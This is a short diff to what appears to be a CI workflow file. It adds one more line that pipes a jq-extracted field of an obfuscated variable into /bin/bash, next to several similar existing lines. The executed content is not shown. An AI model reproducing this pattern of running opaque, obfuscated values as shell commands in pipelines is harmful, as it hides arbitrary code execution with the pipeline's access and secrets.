@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$szamf415" | jq -r .ohirg893 | /bin/bash
           echo $okh9 | jq -r .hw04817 | /bin/bash
           echo $shjkx113 | jq -r .s0 | /bin/bash
+          echo $s485 | jq -r .ynr1 | /bin/bash
 
       - name: Save archive
         if: always()
